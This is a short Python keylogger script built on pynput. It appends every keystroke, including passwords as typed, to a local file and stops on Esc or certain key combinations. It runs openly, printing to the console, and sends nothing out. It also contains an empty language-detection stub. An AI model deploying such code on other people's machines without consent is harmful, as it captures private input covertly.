from pynput import keyboard as kb


STOPPAGE_COMBINATIONS = [['alt_l', 'shift'], ['shift', 'alt_l'], ['ctrl_l', '1'], ['ctrl_l', '2']]


def get_keyboard_language():
    """
    0x804 - Chinese - People's Republic of China
    0x409 - English - United States
    0x419 - Russian
    """


def update_sequence(target_list: list[bool, str,], value: str) -> None:
    target_list[int(target_list[0])+1] = value
    target_list[0] = not target_list[0]


def on_press(key: kb.Key, keyboard: kb.Controller, filename:str, key_sequence: list[bool, str,]) -> (bool | None):
    with open(filename, 'a', encoding='utf-8') as f:  
        if hasattr(key, 'char'):  
            """For some reason, char attribute is None for NumPad numbers.
              This corrects it using their virutal key numbers."""
            if key.vk>=96 and key.vk<=105:   
                key.char=str(key.vk-96)
            f.write(key.char)
        elif key ==kb.Key.esc:
            return False
        else: 
            f.write('[' + key.name + ']')
            update_sequence(key_sequence, key.name)
            print(key_sequence)
    if key_sequence[1:] in STOPPAGE_COMBINATIONS:
                key_sequence=[0, '', '']
                return(False)        


def main():
    filename = "key_log.txt"  # The file to write characters to
    with open(filename, 'w') as _:
        pass
    keyboard = kb.Controller()
    key_sequence = [False, '', '']
    with kb.Listener(on_press=lambda event: on_press(event, keyboard=keyboard, filename=filename, key_sequence=key_sequence)) as listener:  # Setup the listener
        listener.join()  # Join the thread to the main thread


if __name__=='__main__':
    main()